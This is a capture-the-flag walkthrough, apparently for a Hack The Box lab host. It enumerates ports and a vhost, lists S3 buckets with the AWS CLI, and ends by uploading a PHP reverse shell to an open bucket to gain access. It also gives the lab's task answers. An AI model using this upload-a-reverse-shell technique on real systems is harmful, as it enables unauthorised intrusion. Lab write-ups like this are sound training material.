## Task 1 How many TCP ports are open?

- `sudo nmap -Pn -sS 10.129.77.119 -p- -vvv`

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

* * *

## Task 2 What is the domain of the email address provided in the "Contact" section of the website?

- `thetoppers.htb`

* * *

## Task 3 In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?

- `/etc/hosts`

* * *

## Task 4 Which sub-domain is discovered during further enumeration?

Add thetopppers.htb to your /etc/hosts file. After adding we can scan for sub-somains.

* * *

## Task 5 Which service is running on the discovered sub-domain?

We have a hint that the sub-domain is two characters here. I dont know of any 2 char or digit wordlists so goign to make one with `crunch 1 2 0123456789abcdefghijklmnopqrstuvqxyz -o dnslist.txt`. DNS with gobuster doesnt work for this list but using gobuster vhost does.

- `gobuster vhost -u thetoppers.htb -t 100 -w dnslist.txt`
- `amazon s3`

* * *

## Task 6 Which command line utility can be used to interact with the service running on the discovered sub-domain?

- `awscli`

* * *

## Task 7 Which command is used to set up the AWS CLI installation?

- `aws configure`

* * *

## Task 8 What is the command used by the above utility to list all of the S3 buckets?

- `aws s3 ls`

* * *

## Task 9 This server is configured to run files written in what web scripting language?

- `php`

* * *

## Submit root flag 

With this information we can now connect to the sevrer. Configure with `aws configure` and use temp parameters.

We can use ls to list the s3 endpoints the server is hosting

- `aws --endpoint=http://s3.thetoppers.htb ls`

Now we can list objects the specific buckets contain.

- `aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`

Seeing as this bucket is available for us to visit and powered by php we can then copy a reverse shell to the server and get access.

- `aws --endpoint=http://s3.thetoppers.htb s3 cp php-reverse-shell.php s3://thetoppers.htb/images/`
